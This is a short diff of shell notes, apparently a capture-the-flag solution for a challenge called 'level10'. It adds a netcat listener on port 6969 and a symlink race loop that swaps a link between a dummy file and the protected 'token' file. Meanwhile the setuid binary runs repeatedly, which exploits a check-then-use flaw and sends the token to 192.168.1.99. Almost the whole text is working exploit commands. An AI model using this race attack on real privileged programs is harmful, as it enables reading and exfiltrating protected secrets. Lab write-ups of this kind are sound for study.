@@ -6,4 +6,8 @@ cat token
 cat ./level10
 nm level10
 man access
-while true; do ln -fs koten link; ln -fs token link; done & while true; do ./level10 link mcm1k@192.168.1.33:~/projects/snokresh/level10/; done
+touch koten
+ln -s koten link
+while true; do nc -l 6969; done
+while true; do ln -fs koten link; ln -fs token link; done & while true; do ./level10 link 192.168.1.99 6969; done
+
